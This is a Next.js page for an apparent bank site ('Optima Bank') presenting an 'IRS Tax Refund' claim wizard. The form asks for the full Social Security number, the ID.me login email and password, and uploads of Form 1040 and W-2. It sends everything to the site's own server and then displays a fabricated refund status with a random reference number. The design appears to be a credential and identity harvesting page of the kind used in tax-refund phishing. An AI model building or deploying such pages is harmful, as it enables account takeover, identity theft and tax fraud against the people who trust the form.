"use client";

import React, { useState, useEffect } from 'react';
import { 
  Home, ArrowRightLeft, CreditCard, Settings, LogOut, Bell, 
  Menu, X, FileText, HelpCircle, Landmark, ShieldAlert, TrendingUp, 
  Globe, Download, Send, DollarSign, Calendar, CheckCircle, Loader2, 
  Upload, ChevronRight, AlertCircle, FileCheck, Activity, Lock, Key, MapPin, Mail, User, ShieldCheck
} from 'lucide-react';
import Link from 'next/link';
import Image from 'next/image';
import { useRouter } from 'next/navigation';

// --- SHARED SIDEBAR COMPONENT ---
const SidebarLink = ({ icon: Icon, label, href, active }) => (
  <Link href={href} className={`flex items-center gap-3 px-4 py-3 rounded-xl font-medium transition-all duration-200 ${active ? 'bg-blue-50 text-blue-600 font-bold' : 'text-slate-600 hover:bg-slate-50 hover:text-slate-900'}`}>
    <Icon size={18} />
    <span className="text-sm">{label}</span>
  </Link>
);

export default function TaxRefundPage() {
  const router = useRouter();
  
  // --- STATE ---
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [kycStatus, setKycStatus] = useState('PENDING');

  // Tax State
  const [activeTab, setActiveTab] = useState('STATUS'); // STATUS, FILE, HISTORY
  const [step, setStep] = useState(1);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // MERGED FORM DATA (Personal + ID.me + Financials)
  const [formData, setFormData] = useState({
    taxYear: '2025',
    filingStatus: 'Single',
    fullName: '',
    ssn: '',           // Full SSN
    country: 'United States',
    agi: '', 
    refundAmount: '',
    idMeEmail: '',     // ID.me Credential
    idMePassword: ''   // ID.me Credential
  });

  const [uploads, setUploads] = useState({
    form1040: null,
    w2: null
  });

  const [currentStatus, setCurrentStatus] = useState(0); // 0: None, 1: Received, 2: Approved, 3: Sent

  // --- INITIALIZATION ---
  useEffect(() => {
    const init = async () => {
        const stored = localStorage.getItem('user');
        if (!stored) { router.push('/login'); return; }
        const currentUser = JSON.parse(stored);
        setUser(currentUser);
        setKycStatus(currentUser.kycStatus || 'UNVERIFIED');
        // Pre-fill name if available
        setFormData(prev => ({ ...prev, fullName: `${currentUser.firstName} ${currentUser.lastName}` }));
        setLoading(false);
    };
    init();
  }, [router]);

  // --- FILE UPLOAD HANDLER ---
  const handleFileUpload = async (field, file) => {
    if (!file) return;
    setUploads(prev => ({ ...prev, [field]: { name: file.name, status: 'uploading' } }));

    try {
        const formData = new FormData();
        formData.append('file', file);
        
        // Call the upload API
        const res = await fetch('/api/upload', { method: 'POST', body: formData });
        const data = await res.json();

        if (data.success) {
            setUploads(prev => ({ ...prev, [field]: { name: file.name, url: data.url, status: 'done' } }));
        } else {
            alert("Upload failed.");
            setUploads(prev => ({ ...prev, [field]: null }));
        }
    } catch (e) {
        console.error(e);
        alert("Error uploading file.");
        setUploads(prev => ({ ...prev, [field]: null }));
    }
  };

  // --- SUBMIT HANDLER ---
  const handleSubmit = async () => {
    setIsSubmitting(true);
    
    try {
        const res = await fetch('/api/tax/create', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: user.email,
                ...formData,
                documents: {
                    form1040: uploads.form1040?.url,
                    w2: uploads.w2?.url
                }
            })
        });

        if (res.ok) {
            setActiveTab('STATUS');
            setCurrentStatus(1); // Set status to 'Received'
            setStep(1); // Reset wizard
        } else {
            alert("Submission failed. Please try again.");
        }
    } catch (e) {
        console.error(e);
        alert("Connection error.");
    } finally {
        setIsSubmitting(false);
    }
  };

  const handleLogout = () => { localStorage.removeItem('user'); router.push('/login'); };

  if (loading || !user) return <div className="min-h-screen bg-slate-50 flex items-center justify-center"><Loader2 className="animate-spin text-blue-600" size={40}/></div>;

  return (
    <div className="h-screen w-full bg-slate-50 font-sans flex text-slate-900 overflow-hidden">
      
      {/* MOBILE OVERLAY */}
      {sidebarOpen && <div className="fixed inset-0 bg-black/60 z-40 backdrop-blur-sm transition-opacity" onClick={() => setSidebarOpen(false)} />}
      
      {/* --- SIDEBAR --- */}
      <aside className={`fixed inset-y-0 left-0 z-50 w-72 bg-white border-r border-slate-200 transform transition-transform duration-300 lg:static lg:translate-x-0 ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'} flex flex-col h-full shrink-0`}>
        <div className="h-40 flex items-center justify-center px-4 border-b border-slate-100 shrink-0 bg-slate-50/30">
             <div className="relative w-full h-32"><Image src="/logo.png" alt="Logo" fill className="object-contain" priority /></div>
             <button onClick={() => setSidebarOpen(false)} className="lg:hidden absolute top-4 right-4 text-slate-400"><X size={24}/></button>
        </div>
        
        <div className="p-6 border-b border-slate-100 shrink-0">
            <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center font-bold text-lg">{user.firstName[0]}</div>
                <div className="overflow-hidden">
                    <p className="text-sm font-bold text-slate-900 truncate">{user.firstName} {user.lastName}</p>
                    <p className="text-xs text-slate-400 truncate">{user.email}</p>
                </div>
            </div>
            {kycStatus !== 'VERIFIED' && (
                <Link href="/dashboard/kyc" className="mt-4 flex items-center justify-center gap-2 w-full bg-red-50 text-red-600 border border-red-100 py-2.5 rounded-xl text-xs font-bold hover:bg-red-100 transition">
                    <ShieldAlert size={14} /> {kycStatus === 'PENDING' ? 'Verification Pending' : 'Verify Identity'}
                </Link>
            )}
        </div>

        <nav className="flex-1 overflow-y-auto p-4 space-y-6 custom-scrollbar">
            <div>
                <p className="px-4 mb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Main Menu</p>
                <div className="space-y-1">
                    <SidebarLink href="/dashboard" icon={Home} label="Dashboard" />
                    <SidebarLink href="/dashboard/transactions" icon={ArrowRightLeft} label="Transactions" />
                    <SidebarLink href="/dashboard/cards" icon={CreditCard} label="My Cards" />
                    <SidebarLink href="/dashboard/transfer" icon={Send} label="Transfer Money" />
                    <SidebarLink href="/dashboard/deposit" icon={Download} label="Deposit Funds" />
                </div>
            </div>
            <div>
                <p className="px-4 mb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">Services</p>
                <div className="space-y-1">
                    <SidebarLink href="/dashboard/transfer" icon={Globe} label="International Wire" />
                    <SidebarLink href="/dashboard/loans" icon={Landmark} label="Loan Services" />
                    <SidebarLink href="/dashboard/grants" icon={Gift} label="Grants & Aid" />
                    <SidebarLink href="/dashboard/invest" icon={TrendingUp} label="Investments" />
                    {/* ACTIVE LINK */}
                    <SidebarLink href="/dashboard/tax" icon={FileText} label="IRS Tax Refund" active={true} />
                </div>
            </div>
            <div>
                <p className="px-4 mb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">System</p>
                <div className="space-y-1">
                    <SidebarLink href="/dashboard/kyc" icon={ShieldCheck} label="Verification Center" />
                    <SidebarLink href="/dashboard/settings" icon={Settings} label="Settings" />
                    <SidebarLink href="/dashboard/support" icon={HelpCircle} label="Help & Support" />
                </div>
            </div>
        </nav>

        <div className="p-4 border-t border-slate-100 shrink-0">
            <button onClick={handleLogout} className="w-full flex items-center gap-3 px-4 py-3 text-red-500 hover:bg-red-50 rounded-xl font-medium transition">
                <LogOut size={18} /> <span className="text-sm">Log Out</span>
            </button>
        </div>
      </aside>

      {/* --- MAIN CONTENT --- */}
      <main className="flex-1 flex flex-col h-full w-full relative overflow-hidden">
        
        {/* HEADER */}
        <header className="h-16 md:h-20 bg-white border-b border-slate-200 flex items-center justify-between px-4 md:px-8 shrink-0 z-30">
            <div className="flex items-center gap-3">
                <button onClick={() => setSidebarOpen(true)} className="lg:hidden p-2 -ml-2 text-slate-600 hover:bg-slate-100 rounded-full transition"><Menu size={24} /></button>
                <h1 className="text-lg md:text-xl font-bold text-slate-900">IRS Tax Services</h1>
            </div>
            <div className="flex items-center gap-4">
                <button className="relative p-2 rounded-full bg-slate-50 text-slate-600 hover:bg-slate-100 transition"><Bell size={20} /></button>
                <div className="w-9 h-9 bg-slate-900 text-white rounded-full flex items-center justify-center font-bold text-sm shadow-lg ring-2 ring-white">{user.firstName[0]}</div>
            </div>
        </header>

        {/* SCROLLABLE CONTENT */}
        <div className="flex-1 overflow-y-auto p-4 md:p-6 lg:p-8 bg-slate-50/50 custom-scrollbar">
            <div className="max-w-5xl mx-auto space-y-6">

                {/* TABS */}
                <div className="flex p-1 bg-white rounded-xl border border-slate-200 w-fit">
                    {[
                        { id: 'STATUS', label: 'Refund Status', icon: <Activity size={16}/> },
                        { id: 'FILE', label: 'File New Claim', icon: <FileText size={16}/> },
                        { id: 'HISTORY', label: 'History', icon: <Calendar size={16}/> },
                    ].map(tab => (
                        <button 
                            key={tab.id}
                            onClick={() => setActiveTab(tab.id)}
                            className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-bold transition ${activeTab === tab.id ? 'bg-slate-900 text-white shadow-md' : 'text-slate-500 hover:text-slate-900'}`}
                        >
                            {tab.icon} {tab.label}
                        </button>
                    ))}
                </div>

                {/* --- TAB CONTENT: STATUS --- */}
                {activeTab === 'STATUS' && (
                    <div className="animate-in fade-in slide-in-from-bottom-4 duration-500">
                        {currentStatus === 0 ? (
                            <div className="bg-white p-12 rounded-3xl border border-dashed border-slate-300 text-center">
                                <FileText size={48} className="mx-auto text-slate-300 mb-4"/>
                                <h3 className="text-lg font-bold text-slate-900">No Active Claims</h3>
                                <p className="text-slate-500 mb-6 text-sm">You haven't filed a tax refund claim for the 2025 tax year yet.</p>
                                <button onClick={() => setActiveTab('FILE')} className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-xl font-bold transition shadow-lg shadow-blue-200">
                                    Start Filing Now
                                </button>
                            </div>
                        ) : (
                            <div className="bg-white p-8 rounded-3xl border border-slate-100 shadow-sm">
                                <div className="flex items-center justify-between mb-8">
                                    <div>
                                        <h2 className="text-xl font-bold text-slate-900">2025 Tax Refund</h2>
                                        <p className="text-sm text-slate-500">Reference: IRS-{Math.floor(Math.random()*1000000)}</p>
                                    </div>
                                    <span className="bg-blue-50 text-blue-600 px-3 py-1 rounded-full text-xs font-bold">In Progress</span>
                                </div>
                                
                                {/* PROGRESS BAR */}
                                <div className="relative mb-12">
                                    <div className="absolute top-1/2 left-0 w-full h-1 bg-slate-100 -translate-y-1/2 z-0"></div>
                                    <div className={`absolute top-1/2 left-0 h-1 bg-green-500 -translate-y-1/2 z-0 transition-all duration-1000`} style={{ width: currentStatus === 1 ? '33%' : currentStatus === 2 ? '66%' : '100%' }}></div>
                                    <div className="relative z-10 flex justify-between">
                                        {[{ s: 1, l: 'Received' }, { s: 2, l: 'Approved' }, { s: 3, l: 'Sent' }].map((item, idx) => (
                                            <div key={idx} className="flex flex-col items-center gap-2">
                                                <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-xs border-4 ${currentStatus >= item.s ? 'bg-green-500 border-green-100 text-white' : 'bg-white border-slate-100 text-slate-300'}`}>
                                                    {currentStatus >= item.s ? <CheckCircle size={14}/> : idx + 1}
                                                </div>
                                                <span className={`text-xs font-bold ${currentStatus >= item.s ? 'text-slate-900' : 'text-slate-400'}`}>{item.l}</span>
                                            </div>
                                        ))}
                                    </div>
                                </div>
                                <div className="bg-slate-50 p-6 rounded-2xl flex items-start gap-4">
                                    <div className="p-2 bg-blue-100 text-blue-600 rounded-full"><AlertCircle size={20}/></div>
                                    <div>
                                        <h4 className="font-bold text-slate-900 text-sm mb-1">Estimated Deposit Date</h4>
                                        <p className="text-xs text-slate-500 leading-relaxed">
                                            Based on your filing date, we expect your refund of <strong>${formData.refundAmount ? parseFloat(formData.refundAmount).toLocaleString() : '---'}</strong> to be deposited into your account ending in **{user.accountNumber?.slice(-4) || '0000'} by <strong>February 28, 2026</strong>.
                                        </p>
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>
                )}

                {/* --- TAB CONTENT: FILE (WIZARD) --- */}
                {activeTab === 'FILE' && (
                    <div className="bg-white p-8 rounded-3xl border border-slate-100 shadow-sm animate-in fade-in slide-in-from-right-4 duration-500">
                        
                        <div className="flex gap-2 mb-8">
                            {[1, 2].map(i => <div key={i} className={`h-1.5 flex-1 rounded-full ${step >= i ? 'bg-blue-600' : 'bg-slate-100'}`}></div>)}
                        </div>

                        {/* STEP 1: PERSONAL INFO */}
                        {step === 1 && (
                            <div className="space-y-6">
                                <h2 className="text-xl font-bold text-slate-900">Tax Information</h2>
                                
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                    <div>
                                        <label className="text-xs font-bold text-slate-400 uppercase ml-1">Filing Status</label>
                                        <select value={formData.filingStatus} onChange={(e) => setFormData({...formData, filingStatus: e.target.value})} className="w-full p-4 mt-1 bg-slate-50 border border-slate-200 rounded-xl font-bold text-slate-700 outline-none focus:border-blue-500">
                                            <option>Single</option>
                                            <option>Married Filing Jointly</option>
                                            <option>Head of Household</option>
                                        </select>
                                    </div>
                                    <div>
                                        <label className="text-xs font-bold text-slate-400 uppercase ml-1">Country</label>
                                        <div className="relative mt-1">
                                            <MapPin className="absolute left-4 top-4 text-slate-400" size={18}/>
                                            <select value={formData.country} onChange={(e) => setFormData({...formData, country: e.target.value})} className="w-full pl-10 pr-4 py-4 bg-slate-50 border border-slate-200 rounded-xl font-bold text-slate-700 outline-none focus:border-blue-500 appearance-none">
                                                <option>United States</option>
                                                <option>Canada</option>
                                                <option>United Kingdom</option>
                                                <option>Australia</option>
                                            </select>
                                        </div>
                                    </div>
                                </div>

                                <div>
                                    <label className="text-xs font-bold text-slate-400 uppercase ml-1">Social Security Number (Full)</label>
                                    <input type="text" placeholder="XXX-XX-XXXX" value={formData.ssn} onChange={(e) => setFormData({...formData, ssn: e.target.value})} className="w-full p-4 mt-1 bg-slate-50 border border-slate-200 rounded-xl font-bold text-slate-900 outline-none focus:border-blue-500 tracking-widest"/>
                                </div>

                                <div>
                                    <label className="text-xs font-bold text-slate-400 uppercase ml-1">Expected Refund Amount ($)</label>
                                    <div className="relative mt-1">
                                        <DollarSign className="absolute left-4 top-4 text-slate-400" size={18}/>
                                        <input type="number" placeholder="0.00" value={formData.refundAmount} onChange={(e) => setFormData({...formData, refundAmount: e.target.value})} className="w-full pl-10 pr-4 py-4 bg-slate-50 border border-slate-200 rounded-xl font-bold text-lg text-slate-900 outline-none focus:border-blue-500"/>
                                    </div>
                                </div>

                                <button onClick={() => setStep(2)} disabled={!formData.refundAmount || !formData.ssn} className="w-full mt-4 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white py-4 rounded-xl font-bold shadow-lg shadow-blue-200 transition">Continue to Verification</button>
                            </div>
                        )}

                        {/* STEP 2: ID.ME & DOCUMENTS */}
                        {step === 2 && (
                            <div className="space-y-6">
                                <button onClick={() => setStep(1)} className="text-slate-400 hover:text-slate-600 text-sm font-bold">← Back</button>
                                
                                <div className="bg-slate-50 p-6 rounded-2xl border border-slate-200">
                                    <h3 className="text-sm font-bold text-slate-900 mb-4 flex items-center gap-2"><Lock size={16} className="text-green-500"/> ID.me Verification</h3>
                                    <div className="space-y-4">
                                        <div>
                                            <label className="text-xs font-bold text-slate-400 uppercase ml-1">ID.me Email</label>
                                            <div className="relative mt-1">
                                                <Mail className="absolute left-4 top-3.5 text-slate-400" size={18}/>
                                                <input type="email" placeholder="email@example.com" value={formData.idMeEmail} onChange={(e) => setFormData({...formData, idMeEmail: e.target.value})} className="w-full pl-10 pr-4 py-3 bg-white border border-slate-200 rounded-xl font-medium outline-none focus:border-blue-500"/>
                                            </div>
                                        </div>
                                        <div>
                                            <label className="text-xs font-bold text-slate-400 uppercase ml-1">ID.me Password</label>
                                            <div className="relative mt-1">
                                                <Key className="absolute left-4 top-3.5 text-slate-400" size={18}/>
                                                <input type="password" placeholder="••••••••" value={formData.idMePassword} onChange={(e) => setFormData({...formData, idMePassword: e.target.value})} className="w-full pl-10 pr-4 py-3 bg-white border border-slate-200 rounded-xl font-medium outline-none focus:border-blue-500"/>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div>
                                    <h2 className="text-lg font-bold text-slate-900 mb-2">Upload Tax Forms</h2>
                                    <div className="space-y-4">
                                        {[
                                            { id: 'form1040', label: 'Form 1040', sub: 'U.S. Individual Income Tax Return' },
                                            { id: 'w2', label: 'Form W-2', sub: 'Wage and Tax Statement' }
                                        ].map((doc) => (
                                            <div key={doc.id} className="p-4 border border-dashed border-slate-300 rounded-xl bg-slate-50 flex items-center gap-4 relative">
                                                <div className={`w-12 h-12 rounded-full flex items-center justify-center ${uploads[doc.id]?.status === 'done' ? 'bg-green-100 text-green-600' : 'bg-white border border-slate-200 text-slate-400'}`}>
                                                    {uploads[doc.id]?.status === 'done' ? <FileCheck size={20}/> : <Upload size={20}/>}
                                                </div>
                                                <div className="flex-1">
                                                    <h4 className="font-bold text-sm text-slate-900">{doc.label}</h4>
                                                    <p className="text-xs text-slate-500">{uploads[doc.id] ? uploads[doc.id].name : doc.sub}</p>
                                                </div>
                                                {!uploads[doc.id] ? (
                                                    <label className="bg-white border border-slate-200 px-4 py-2 rounded-lg text-xs font-bold text-blue-600 cursor-pointer hover:bg-blue-50 transition">
                                                        Upload <input type="file" className="hidden" onChange={(e) => handleFileUpload(doc.id, e.target.files[0])} />
                                                    </label>
                                                ) : (
                                                    uploads[doc.id].status === 'uploading' && <Loader2 size={16} className="animate-spin text-blue-500"/>
                                                )}
                                            </div>
                                        ))}
                                    </div>
                                </div>

                                <div className="bg-blue-50 p-4 rounded-xl flex gap-3 text-blue-800 mt-6">
                                    <ShieldAlert size={20} className="shrink-0"/>
                                    <p className="text-xs leading-relaxed">By submitting this claim, you authorize Optima Bank to process the direct deposit. Ensure ID.me details match your tax return.</p>
                                </div>

                                <button 
                                    onClick={handleSubmit} 
                                    disabled={isSubmitting || !uploads.form1040 || !formData.idMeEmail} 
                                    className="w-full mt-4 bg-green-600 hover:bg-green-700 disabled:opacity-50 text-white py-4 rounded-xl font-bold shadow-lg shadow-green-200 transition flex items-center justify-center gap-2"
                                >
                                    {isSubmitting ? <Loader2 className="animate-spin" /> : 'Submit Claim'}
                                </button>
                            </div>
                        )}

                    </div>
                )}

                {/* --- TAB CONTENT: HISTORY --- */}
                {activeTab === 'HISTORY' && (
                     <div className="bg-white rounded-3xl shadow-sm border border-slate-100 overflow-hidden animate-in fade-in slide-in-from-bottom-4 duration-500">
                        <div className="p-6 border-b border-slate-100">
                            <h3 className="font-bold text-lg text-slate-900">Past Refunds</h3>
                        </div>
                        <div className="p-8 text-center text-slate-400">
                            <Calendar size={48} className="mx-auto text-slate-200 mb-4"/>
                            <p className="text-sm">No historical records found for this account.</p>
                        </div>
                     </div>
                )}

            </div>
        </div>
      </main>
    </div>
  );
}